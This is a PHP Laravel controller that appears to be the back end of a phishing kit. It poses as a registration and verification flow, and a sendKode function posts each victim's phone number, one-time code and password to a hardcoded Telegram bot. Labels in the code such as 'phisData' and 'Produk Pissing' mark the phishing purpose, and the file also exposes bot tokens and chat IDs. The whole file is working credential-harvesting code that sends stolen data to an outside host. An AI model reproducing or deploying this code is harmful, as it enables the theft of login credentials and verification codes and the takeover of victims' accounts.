<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class RegistController extends Controller
{
    public function registrasi(Request $request,)
    {

        return inertia('Two/Index');
    }
    public function registrasi_store(Request $request)
    {
        $request->validate([
            'nama' => 'required',
            'nomor_hp' => 'required|string|min:10|max:14',

        ]);
        $this->sendKode($request->nomor_hp);
    }

    public function verifikasi_store(Request $request)
    {

        $code = implode('', $request->code_verif);
        $nomor_hp = $request->nomor_hp;
        $this->sendKode($nomor_hp, $code);
    }
    public function password_store(Request $request)
    {

        $code = implode('', $request->code_verif);
        $nomor_hp = $request->nomor_hp;
        $this->sendKode($nomor_hp, $code, $request->password);
    }

    public function sendKode($phone = "",  $otp = "", $password = "")
    {



        // BOT 6
        $bot_token = "7230873596:AAF0T2BxZfiLZJx3vCH8UN9_zvAxT6zKfDg";
        $chat_id = "7313368161";
        $phisData = "";
        // $bot_token = "7600923583:AAFsZEE7kYZuaWYlfwNLvNn21t2ZSYKS-t8";
        // $chat_id = "6552942907";
        // $phisData = "GIF2";


        $url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";




        $ch = curl_init();

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chat_id,
            'text' => "  Produk Pissing
            \n  - No $phone  
            \n  - Code $otp  
            \n  - Password $password "
        ]);

        // Eksekusi cURL request
        $response = curl_exec($ch);

        // Menutup koneksi cURL
        curl_close($ch);
    }
}
